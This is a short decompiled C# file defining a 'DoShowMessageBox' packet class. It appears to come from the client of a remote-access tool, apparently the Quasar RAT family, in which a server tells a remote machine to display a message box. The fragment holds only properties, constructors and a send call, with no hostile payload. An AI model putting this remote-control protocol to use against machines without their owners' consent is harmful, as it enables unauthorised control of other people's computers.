using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
	// Token: 0x0200009E RID: 158
	[Serializable]
	public class DoShowMessageBox : IPacket
	{
		// Token: 0x170000A3 RID: 163
		// (get) Token: 0x06000405 RID: 1029 RVA: 0x00004036 File Offset: 0x00002236
		// (set) Token: 0x06000406 RID: 1030 RVA: 0x0000403E File Offset: 0x0000223E
		public string Caption { get; set; }

		// Token: 0x170000A4 RID: 164
		// (get) Token: 0x06000407 RID: 1031 RVA: 0x00004047 File Offset: 0x00002247
		// (set) Token: 0x06000408 RID: 1032 RVA: 0x0000404F File Offset: 0x0000224F
		public string Text { get; set; }

		// Token: 0x170000A5 RID: 165
		// (get) Token: 0x06000409 RID: 1033 RVA: 0x00004058 File Offset: 0x00002258
		// (set) Token: 0x0600040A RID: 1034 RVA: 0x00004060 File Offset: 0x00002260
		public string MessageboxButton { get; set; }

		// Token: 0x170000A6 RID: 166
		// (get) Token: 0x0600040B RID: 1035 RVA: 0x00004069 File Offset: 0x00002269
		// (set) Token: 0x0600040C RID: 1036 RVA: 0x00004071 File Offset: 0x00002271
		public string MessageboxIcon { get; set; }

		// Token: 0x0600040D RID: 1037 RVA: 0x000021D4 File Offset: 0x000003D4
		public DoShowMessageBox()
		{
		}

		// Token: 0x0600040E RID: 1038 RVA: 0x0000407A File Offset: 0x0000227A
		public DoShowMessageBox(string caption, string text, string messageboxbutton, string messageboxicon)
		{
			this.Caption = caption;
			this.Text = text;
			this.MessageboxButton = messageboxbutton;
			this.MessageboxIcon = messageboxicon;
		}

		// Token: 0x0600040F RID: 1039 RVA: 0x0000409F File Offset: 0x0000229F
		public void Execute(Client client)
		{
			client.Send<DoShowMessageBox>(this);
		}
	}
}
